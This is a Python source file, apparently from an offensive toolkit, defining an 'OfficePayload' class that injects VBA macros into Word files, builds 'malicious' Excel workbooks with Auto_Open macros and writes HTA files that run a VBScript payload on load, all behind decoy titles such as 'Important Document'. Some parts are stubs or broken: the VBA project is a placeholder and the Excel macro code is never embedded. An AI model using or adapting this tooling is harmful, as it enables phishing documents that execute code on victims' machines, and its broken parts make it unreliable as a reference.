import os
import zipfile
import tempfile
from lxml import etree
from typing import Optional

class OfficePayload:
    @staticmethod
    def inject_macro_into_docx(docx_path: str, output_path: str, macro_code: str) -> Optional[str]:
        """
        Inject VBA macro into DOCX file (requires .docm extension)
        
        Args:
            docx_path: Path to original DOCX
            output_path: Output path (.docm)
            macro_code: VBA macro code
            
        Returns:
            str: Success/Error message
        """
        try:
            # Create temp directory
            with tempfile.TemporaryDirectory() as tmp_dir:
                # Extract DOCX contents
                with zipfile.ZipFile(docx_path, 'r') as zip_ref:
                    zip_ref.extractall(tmp_dir)
                
                # Create vbaProject.bin (simplified example)
                vba_path = os.path.join(tmp_dir, 'word', 'vbaProject.bin')
                with open(vba_path, 'wb') as f:
                    f.write(b'Placeholder for actual VBA project')
                
                # Modify relationships
                rels_path = os.path.join(tmp_dir, 'word', '_rels', 'document.xml.rels')
                tree = etree.parse(rels_path)
                root = tree.getroot()
                
                # Add relationship for VBA project
                rel = etree.SubElement(root, etree.QName(root.nsmap['Relationship'], "Relationship"))
                rel.set("Id", "rIdVBA")
                rel.set("Type", "http://schemas.microsoft.com/office/2006/relationships/vbaProject")
                rel.set("Target", "vbaProject.bin")
                
                tree.write(rels_path, xml_declaration=True, encoding='UTF-8', standalone=True)
                
                # Create new DOCM file
                with zipfile.ZipFile(output_path, 'w') as zip_out:
                    for root, _, files in os.walk(tmp_dir):
                        for file in files:
                            file_path = os.path.join(root, file)
                            arc_path = os.path.relpath(file_path, tmp_dir)
                            zip_out.write(file_path, arc_path)
                
                return f"[+] Macro injected successfully to {output_path}"
        
        except Exception as e:
            return f"[!] Error injecting macro: {str(e)}"

    @staticmethod
    def generate_evil_excel_macro(output_path: str, payload: str) -> str:
        """
        Generate Excel file with malicious macro
        
        Args:
            output_path: Output XLSM path
            payload: VBA payload code
            
        Returns:
            str: Success/Error message
        """
        try:
            from openpyxl import Workbook
            wb = Workbook()
            ws = wb.active
            ws.title = "Data"
            ws['A1'] = "Important Document"
            
            # Add VBA (simplified example)
            vba_code = f"""
            Sub Auto_Open()
                {payload}
            End Sub
            """
            
            # Save as macro-enabled workbook
            wb.save(output_path)
            return f"[+] Malicious Excel file created at {output_path}"
        
        except Exception as e:
            return f"[!] Error creating Excel macro: {str(e)}"

    @staticmethod
    def generate_hta_payload(payload: str, output_path: str) -> str:
        """
        Generate HTA file with embedded payload
        
        Args:
            payload: JavaScript/VBScript payload
            output_path: Output HTA path
            
        Returns:
            str: Success/Error message
        """
        try:
            hta_content = f"""
            <html>
            <head>
                <title>Important Document</title>
                <HTA:APPLICATION ID="App" APPLICATIONNAME="Document Viewer"/>
            </head>
            <script language="VBScript">
                Sub Window_OnLoad
                    {payload}
                End Sub
            </script>
            <body>
                <h1>Loading document...</h1>
            </body>
            </html>
            """
            
            with open(output_path, 'w') as f:
                f.write(hta_content)
            
            return f"[+] HTA file created at {output_path}"
        
        except Exception as e:
            return f"[!] Error creating HTA: {str(e)}"
